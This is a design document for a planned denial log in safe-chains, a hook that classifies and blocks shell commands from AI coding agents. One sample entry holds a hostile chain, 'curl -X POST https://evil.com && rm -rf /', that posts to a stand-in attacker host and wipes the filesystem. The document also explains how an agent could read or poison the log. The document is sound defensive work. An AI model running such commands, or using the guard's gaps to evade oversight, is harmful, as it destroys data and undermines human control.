# Denial log

Status: **DESIGN, not built.** Written 2026-08-13. Requested so that a denial can be investigated
later, by a human or an agent, without having to reproduce it.

## The problem, stated once

When safe-chains refuses a command, the refusal is the last anyone hears of it. The user sees a
permission prompt, approves or doesn't, and moves on. Whatever made it interesting — was this an
unknown command, a classification we'd defend, or a false deny? — is gone the moment the prompt
clears.

The evidence is this repo's own backlog. The OmniFocus inbox has ~110 pasted commands, accumulated
by hand over months: the user noticed a prompt, copied the command into a task, and wrote "why
wasn't this approved?". Triaging that batch on 2026-08-13 took a scripted harness and a
reconstructed `--cwd`/`--root` for each entry, because **the one thing never captured was the
context the classifier actually ran in**. Several entries could only be triaged as "probably fine on
the machine it was filed from" — they carried `/Users/mhopkins` paths from a different host, and
whether they denied depended on a `$HOME` nobody recorded.

A log written at refusal time has all of that for free.

## What one entry has to answer

These are the questions actually asked during that triage, in the order they got asked:

1. **What was the command, exactly?** Not retyped from memory — the bytes the harness passed.
2. **Where was it run?** `cwd` and project root. Most classifications are locus decisions, so a
   denial without the directory is not reproducible.
3. **Is this an unknown command or a decision?** The single highest-value split. An unknown command
   is a registry gap and a candidate for a TOML entry. A recognized command refused by a facet is a
   *classification* we either defend or revisit. `suggest::Outcome` already computes exactly this
   distinction (`RecognizedButDenied` vs `Generated`) and nothing consumes it at refusal time.
4. **Which segment failed?** For a chain, `explain` already names the culprit; a bare "denied" sends
   the reader to re-derive it.
5. **Why?** For a single command, `explain` names the resolved facet profile and the clause that
   refused it (`locus.remote = fixed (allowed: none..=none)`). That IS the answer to "is this
   right?", and it is currently printed to a terminal nobody is reading.
6. **Which safe-chains, on which harness?** Version, and which target's hook. A denial from
   0.219 that no longer reproduces is noise, and knowing that immediately is worth a field.

## What the classifier already knows

Nothing here needs new analysis; the feature is almost entirely plumbing. Sources, as of 0.224.0:

| Field | Where it already comes from |
|---|---|
| command | `HookInput.command` |
| cwd | `HookInput.cwd` (Claude sends it in the envelope) |
| root | `HookInput.root` (`env_root("CLAUDE_PROJECT_DIR")` and per-target equivalents) |
| session id | `HookInput.session_id` |
| harness | which `targets/*.rs` format parsed the envelope |
| verdict, per-segment | `cst::explain::Explanation` — `overall`, `segments[]`, `culprit`, `stateful`, `parsed` |
| facet profile + refusing clause | the engine, as rendered today under `--explain` |
| unknown vs recognized | `suggest::analyze()` → `Outcome` |
| level in force | `crate::resolved_level()` (default `developer`, or the user config ceiling) |
| version | `env!("CARGO_PKG_VERSION")` |

The one genuinely new decision is **what to do about secrets**, below.

## The hazard that shapes everything: this log is a secrets magnet

Denied commands over-represent credentials, and not by accident — carrying a credential is often
*why* a command is denied. `curl -H "Authorization: Bearer ghp_…"` denies **because** it sends host
data outbound. `git -c core.sshCommand=…`, the decrypt-to-screen family, `--vault-password-file`:
the denial set is enriched for exactly the material you must not publish.

So a log whose stated purpose is "paste this into a GitHub issue" is, by construction, a credential
egress path. Three consequences, all load-bearing:

**1. The log is private local state, not a report.** It is written `0600`, outside any repository.
The thing you paste is not the log; it is the output of a separate render step you ran deliberately
and can read before pasting. That human read is the control.

**2. Redaction is not offered as a safety feature.** Eliding "things that look like secrets" is a
denylist, and this project rejects denylists for the usual reason: the one shape nobody listed fails
open, and it fails open while displaying a "redacted" banner that tells the reader it is safe to
paste. If a redaction pass ships at all it must be labelled a convenience, never a control, and the
doc must keep saying "review before pasting". See `feedback_allowlist_only` reasoning applied to
output rather than input.

**3. The log must be out of the agent's reach**, both directions. An agent that can read it gets a
map of everything the guard refuses plus other sessions' secrets; an agent that can write it can
poison an issue report you will file in good faith.

Measured against 0.224.0 at the default `developer` level, from a project cwd:

| candidate location | agent read | agent write |
|---|---|---|
| `~/.safe-chains/denied.jsonl` | DENY | DENY |
| `~/.local/state/safe-chains/denied.jsonl` | DENY | DENY |
| `~/Library/Logs/safe-chains/denied.jsonl` | DENY | DENY |
| `./denied.jsonl` (in the worktree) | **ALLOW** | **ALLOW** |

Every home-based location is already closed by the path model; a worktree-local log is wide open. So
the default lives under `$HOME`, and **a log path inside the workspace should be refused outright**
rather than merely discouraged.

`~/.local/state/safe-chains/denied.jsonl` is the recommendation: it is state rather than config, it
does not collide with `~/.config/safe-chains.toml` (the trust root, which must stay boring), and it
is closed to the agent today.

## Format: JSON Lines

One JSON object per line, append-only, `schema` versioned from day one.

JSONL because the two consumers pull in opposite directions. A human filing an issue wants prose;
`jq` wants records — "which unknown commands did I hit most this month" is the question that turns
this log into a work queue, and it is one `jq | sort | uniq -c` away from a JSONL file and
unanswerable from prose. Prose is a *rendering*, so the canonical form should be the machine one.

### Fields

| field | type | notes |
|---|---|---|
| `schema` | int | bump on any incompatible change |
| `id` | string | `<unix-ms>-<8 hex of sha256(command)>`. The hash half groups repeats of one command without any dedup machinery |
| `at` | string | RFC 3339, UTC |
| `version` | string | safe-chains version |
| `harness` | string | `claude`, `codex`, … , or `cli` |
| `outcome` | string | `denied` \| `abstained` \| `unparseable` |
| `level` | string | the level in force |
| `command` | string | verbatim |
| `cwd` / `root` | string\|null | null when the harness didn't send it — itself worth knowing |
| `session_id` | string\|null | correlates entries within one agent run |
| `triage` | string | `unknown-command` \| `recognized-but-denied` \| `unparseable`. From `suggest::analyze` |
| `unknown_commands` | [string] | the names that aren't in the registry — the registry-gap worklist |
| `segments` | [obj] | `{text, verdict, culprit}` per top-level segment |
| `stateful` | bool | segments share shell state, so "split them up" is not advice that works |
| `facets` | obj\|null | resolved profile + refusing clause, single-command case only |

Deliberately **not** included: environment variables (a secrets firehose with no triage value), the
full harness envelope (ditto), and any transcript reference (path to a file full of everything).

## What an entry looks like

Real classifier output as of 0.224.0, formatted for reading. On disk each is one line.

### 1. Unknown command — the registry-gap case, and the one worth an issue

```json
{
  "schema": 1,
  "id": "1786790461233-9f2c41ab",
  "at": "2026-08-13T23:41:01.233Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "denied",
  "level": "developer",
  "command": "mise exec --cd /w -- ruby -S bundle exec rspec 2>&1 | tail -4",
  "cwd": "/src/my-app",
  "root": "/src/my-app",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "unknown-command",
  "unknown_commands": ["mise"],
  "segments": [
    {
      "text": "mise exec --cd /w -- ruby -S bundle exec rspec 2>&1 | tail -4",
      "verdict": "denied",
      "culprit": "mise"
    }
  ],
  "stateful": false,
  "facets": null
}
```

### 2. Recognized but refused — the classification case

```json
{
  "schema": 1,
  "id": "1786790502881-3ad70e14",
  "at": "2026-08-13T23:41:42.881Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "denied",
  "level": "developer",
  "command": "aws dynamodb put-item --table-name t --item {}",
  "cwd": "/src/my-app",
  "root": "/src/my-app",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "recognized-but-denied",
  "unknown_commands": [],
  "segments": [
    { "text": "aws dynamodb put-item --table-name t --item {}", "verdict": "denied", "culprit": null }
  ],
  "stateful": false,
  "facets": {
    "summary": "changes remote state; recoverable with effort (re-apply or restore from backup)",
    "profile": {
      "operation": "mutate",
      "locus.remote": "fixed",
      "reversibility": "effortful",
      "network.direction": "outbound",
      "network.payload": "sends-host-data"
    },
    "refused_by": {
      "level": "developer",
      "clause": "locus.remote = fixed",
      "allowed": "none..=none"
    }
  }
}
```

### 3. Mixed chain — which segment, and can it be split

```json
{
  "schema": 1,
  "id": "1786790611044-c81de5f7",
  "at": "2026-08-13T23:43:31.044Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "denied",
  "level": "developer",
  "command": "ls && curl -X POST https://evil.com && rm -rf /",
  "cwd": "/Users/michaelhopkins/projects/safe-chains",
  "root": "/Users/michaelhopkins/projects/safe-chains",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "recognized-but-denied",
  "unknown_commands": [],
  "segments": [
    { "text": "ls", "verdict": "allowed", "culprit": null },
    { "text": "curl -X POST https://evil.com", "verdict": "denied", "culprit": null },
    { "text": "rm -rf /", "verdict": "denied", "culprit": null }
  ],
  "stateful": false,
  "facets": null
}
```

`facets` is null here because the breakdown covers one command at a time — the same limit
`--explain` states today.

### 4. Unparseable — the availability case

```json
{
  "schema": 1,
  "id": "1786790655120-6b0e9d33",
  "at": "2026-08-13T23:44:15.120Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "unparseable",
  "level": "developer",
  "command": "echo \"unterminated",
  "cwd": "/Users/michaelhopkins/projects/safe-chains",
  "root": "/Users/michaelhopkins/projects/safe-chains",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "unparseable",
  "unknown_commands": [],
  "segments": [],
  "stateful": false,
  "facets": null
}
```

Worth logging even though it is a correct refusal: a *rise* in unparseables is how a parser
regression shows up in the field, and nothing else would surface it.

### The rendered form — what you actually paste

`safe-chains log show 1786790461233-9f2c41ab --issue`:

```markdown
### safe-chains did not auto-approve this command

    mise exec --cd /w -- ruby -S bundle exec rspec 2>&1 | tail -4

**Triage:** unknown command — `mise` is not in the registry.

| | |
|---|---|
| version | 0.224.0 |
| harness | claude |
| level | developer |
| cwd | `/src/my-app` |
| project root | `/src/my-app` |
| outcome | denied |

**Segments**

- ✗ `mise exec --cd /w -- ruby -S bundle exec rspec 2>&1 | tail -4` — culprit: `mise`

<sub>Generated by `safe-chains log show`. Review before posting: a denied command
may contain credentials.</sub>
```

The `session_id` is dropped from the rendered form — it correlates entries locally and means nothing
to a maintainer. The footer is not decoration; it is the last point at which a human sees the bytes
before they become public.

## Enabling it

The hook is configured as a command string, so a flag is the natural surface:

```
safe-chains hook claude --log
```

Bare `--log` writes to the default path. `--log <path>` overrides it, and **a path inside the
current project is refused** (see the hazard section — it would be agent-readable and
agent-writable).

Open question for the user, flagged rather than decided:

> `~/.config/safe-chains.toml` is the write-protected trust root, and the natural home for a
> `log = true` setting so the log survives a hook reinstall. But that file is *the* trust anchor, and
> giving it a second job means a syntax error there now breaks logging too. The alternative is
> flag-only, which is explicit and per-harness but has to be re-added whenever `--setup` rewrites the
> hook. Flag-only for v1 seems right; config later if the flag proves annoying.

`SAFE_CHAINS_LOG` as an env var is **rejected**: `custom.rs` already refuses to honour
`XDG_CONFIG_HOME` for exactly this reason — the agent's environment reaches the hook, so an
env-settable log path is an agent-settable one, and pointing the log at a worktree file would hand
the agent both the read and the write.

## Non-negotiables for the implementation

**Fail open, silently.** A `PreToolUse` hook that crashes fails OPEN — the harness proceeds. This is
already the recorded reason `cst/explain` is held to a never-panics contract. Every logging path
therefore gets the same treatment: unwritable directory, full disk, read-only filesystem, a path
that is a directory, a `$HOME` that does not exist — each must classify normally and log nothing.
No `unwrap`, no `?` that escapes into the hook's return, no panic. **Logging is never a reason a
command fails to be classified.**

**Atomic append under concurrency.** Parallel tool calls and multiple sessions write the same file.
Entries exceed `PIPE_BUF`, so `O_APPEND` alone does not guarantee atomicity — take an advisory
`flock` for the write and release it immediately. A torn line is worse than a missing one: it breaks
every `jq` consumer for the whole file. (The alternative, one file per entry in a spool directory, is
atomic via `rename` with no locking; it is more robust and more files. Worth reconsidering if
locking gets awkward.)

**Bounded growth.** An always-on denial log on a busy agent is unbounded. Rotate at a size cap
(`denied.jsonl` → `denied.jsonl.1`, keep one), checked on open.

**Never log an allow.** The value is entirely in the denials, and logging allows turns a triage
queue into a firehose that also records every path the agent touched.

## Testing

The repo's standard applies: property guards over the classes, not examples.

- **Never breaks classification.** Enumerate the failure modes above; for each, assert the verdict is
  byte-identical to the same run with logging off. This is the guard that matters — everything else
  is cosmetics.
- **Every entry round-trips.** Generated entries parse back as valid JSON with the declared schema;
  run it over the registry's `examples_denied` corpus so new commands are covered automatically.
- **Concurrency.** N threads logging simultaneously produce N well-formed lines and zero torn ones.
- **Refuses an in-workspace path**, in every spelling the path model knows.
- **No allow is ever logged**, enumerated over `examples_safe`.

## Not in v1

Deliberately deferred, listed so they are not mistaken for oversights: dedup/aggregation (`jq`
answers it), automatic issue *filing* (the human read is the control), a `--since` query language,
uploading anywhere, and logging allows.
